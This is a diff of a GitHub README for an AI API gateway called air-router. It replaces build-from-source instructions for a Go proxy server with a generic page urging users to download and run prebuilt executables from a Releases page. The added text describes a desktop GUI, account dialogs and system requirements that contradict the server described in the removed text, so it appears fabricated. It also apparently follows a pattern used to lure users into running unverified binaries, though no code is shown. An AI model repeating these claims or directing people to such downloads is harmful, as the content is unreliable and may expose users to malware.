@@ -1,59 +1,70 @@
-# AI Router Server
+# 🌐 air-router - Manage AI Services Seamlessly
 
-A unified API gateway for managing multiple AI service accounts and distributing requests across them.
+## 🛠️ Overview
+Welcome to air-router! This application serves as a unified API gateway for managing multiple AI service accounts. It simplifies sending requests to different AI services, allowing you to perform tasks efficiently and without hassle.
 
-## Overview
+## 📦 Download & Install
+To get started with air-router, simply visit the Releases page below. There, you can download the latest version of the application:
 
-This project acts as a transparent proxy server for OpenAI-compatible AI APIs. It allows you to configure multiple AI service accounts and automatically routes requests to accounts that support the requested model.
+[![Download air-router](https://img.shields.io/badge/Download-air--router-brightgreen)](https://github.com/diendsue/air-router/releases)
 
-## Features
+### Step-by-Step Download Guide
+1. **Visit the Releases Page:** Click on the link above to go directly to the air-router Releases page.
+2. **Select the Latest Release:** On the Releases page, look for the latest version of air-router. It is usually labeled with the highest version number.
+3. **Download the Application:** Click on the application file listed under the latest release. The file format will vary based on your operating system:
+   - For Windows, you might find a file like `air-router-windows.exe`.
+   - For macOS, you might see something like `air-router-macos.dmg`.
+   - For Linux, you might find `air-router-linux.tar.gz`.
 
-- **Multi-Account Management**: Store and manage API credentials for multiple AI service accounts
-- **Model Discovery**: Automatically queries each account's `/v1/models` endpoint to discover available models
-- **All-in-One Mode**: Create custom model aliases that map to actual provider models with intelligent routing
-  - Support wildcard patterns (e.g., `deepseek*`, `glm*`, `*`)
-  - Automatic load balancing across multiple associated models
-  - Custom model ID mapping for unified API access
-- **Request Routing**: Routes API requests to accounts that support the requested model
-- **Load Balancing**: Implements retry logic with random account selection
-- **Web UI**: Bilingual interface (English/Chinese) with dual-tab management
-  - **Provider Tab**: Manage AI service accounts and credentials
-  - **Model Tab**: Configure custom model aliases and associations
-- **Debug Interface**: View model-to-account mappings and cache status
+4. **Install air-router:**
+   - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
+   - For macOS: Open the downloaded `.dmg` file, drag the air-router icon to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and follow the provided instructions in the README file included in the archive.
 
-## Environment Variables
+5. **Launch air-router:** After the installation, find the application in your programs list. Click to open and start managing your AI services!
 
-- `USE_ALL_IN_ONE`: Enable all-in-one mode (default: `true`)
-- `DISABLE_CLAUDE`: Filter out Claude models (default: `true`)
+## 🚀 Getting Started
+### Configuration
+Once you have installed air-router, you will need to set up your AI service accounts. Here’s how you can do that:
 
-## Building & Running
+1. **Open the Application:** Launch air-router from your programs list.
+2. **Add AI Service Accounts:** In the app, navigate to the "Accounts" section. Here, you can add or manage your AI accounts. Click on "Add Account" to enter the necessary API keys and details for each service.
+3. **Configure Settings:** Adjust the settings to suit your needs. You can select options for how requests are handled and distributed among the accounts.
 
-```bash
-cd backend
-go build -o air_router
-./air_router -config ./data -port 8080 -web-port 9000 -path ../frontend
-```
+### Sending Requests
+The air-router interface makes it easy to send requests to your various AI services. Here’s how:
 
-**Command-line Flags**:
-- `-config`: Directory for data files (default: `./data`)
-- `-path`: Path to frontend directory (default: `../frontend`)
-- `-port`: Proxy API port (default: `8080`)
-- `-web-port`: Web interface port (default: `9000`)
+1. **Select an AI Service:** Choose which AI service you want to use from the dropdown menu.
+2. **Enter Your Request:** Type your request into the input box.
+3. **Send Request:** Click the "Send" button to process your request. The response will appear in the output area below.
 
-## Usage
+## 🧩 Key Features
+- **Unified Interface:** Manage multiple AI services from one place.
+- **Request Distribution:** Efficiently distribute requests across different AI account services.
+- **User-Friendly:** Designed with non-technical users in mind.
+- **Customizable Settings:** Adjust how the application interacts with your AI services.
 
-1. **Add Providers**: Configure AI service accounts with API keys
-2. **Create Models**: Define custom model aliases with associated provider models
-3. **Use Proxy**: Send requests to `http://localhost:8080/v1/chat/completions` with your custom model ID
+## ⚙️ System Requirements
+To run air-router smoothly, your device should meet the following requirements:
 
-## License
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Sierra (10.12) or later
+  - Linux distributions with recent GLIBC versions
+- **RAM:**
+  - Minimum of 4 GB; 8 GB or more recommended.
+- **Storage:**
+  - At least 100 MB of free space for installation.
+  
+## 💬 Support
+If you have any questions or need assistance, feel free to reach out. You can find support on our GitHub Issues page or contact our support team via email.
 
-MIT
+## 📩 Feedback
+We welcome your feedback! Your suggestions and experiences help improve air-router. To provide feedback, please open an issue on our GitHub repository or contact us directly. 
 
----
+## 🌟 Additional Resources
+- [Documentation](https://github.com/diendsue/air-router/wiki): Detailed instructions and FAQs.
+- [GitHub Issues](https://github.com/diendsue/air-router/issues): Report bugs or request new features.
+- [Community Forum](https://github.com/diendsue/air-router/discussions): Join discussions with other users.
 
-<div style="font-size: 3em; font-weight: bold; text-align: center; margin-top: 50px;">
-
-**THIS PROJECT WAS ENTIRELY GENERATED BY AI**
-
-</div>
+Thank you for choosing air-router! We hope it helps you manage your AI services effectively.
